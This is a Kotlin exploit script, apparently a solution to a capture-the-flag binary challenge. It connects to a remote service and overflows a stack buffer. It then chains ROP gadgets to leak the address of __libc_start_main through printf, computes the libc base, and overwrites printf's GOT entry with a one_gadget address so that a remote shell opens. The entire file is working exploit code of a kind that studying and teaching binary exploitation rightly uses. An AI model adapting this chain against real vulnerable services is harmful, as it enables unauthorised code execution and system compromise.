import douro.pwnpack.*
import java.lang.ProcessBuilder
import java.io.*
import java.nio.charset.*
import java.net.Socket
import java.nio.*
fun main(args : Array<String>){
	val p = Remote("problem.harekaze.com", 20005)
	println(p.recv().toString(p.charset))
	val pop_rdi_ret= 0x00400733
	val onerce = 0x4526a
	val printf_got = 0x601018
	val printf_offset = 0x0000000000064e80
	val pop_rsi_r15_ret = 0x00400731
	val libc_start_main = 0x601028
	val printf_plt = 0x4004f0
	val read_plt = 0x400500
	val libc_start_main_offset = 0x000000000020740
	val rop =  Packer(64)
	rop.fillBytes("A".repeat(0x28).b())
	.pack(pop_rdi_ret)
	.pack(libc_start_main)
	.pack(pop_rsi_r15_ret)
	.fillBytes("x00".repeat(6).hexToByte() + "%p".b())
	.pack(0)
	.pack(printf_plt)
	.pack(pop_rdi_ret)
	.pack(0)
	.pack(pop_rsi_r15_ret)
	.pack(printf_got)
	.pack(0)
	.pack(read_plt)
	.pack(printf_plt)
	p.send(rop.toByteArray())
	var r = p.recvUntil(("x0a").hexToByte()) // wirite 
 	r = p.recvUntil(("x7f").hexToByte()) // wirite 
	println(byteArrayToText(r))
	r = r + ("x00".repeat(8-r.size)).hexToByte()
	val real_libc_start_main : Long = u64(r)
	println(real_libc_start_main.toString(16))
	val libc_base = real_libc_start_main - libc_start_main_offset
	rop.clear()
	.pack(libc_base+onerce)
	.fillBytes("x00".repeat(0x40).hexToByte())
	p.send(rop.toByteArray())
	p.interactive()
}

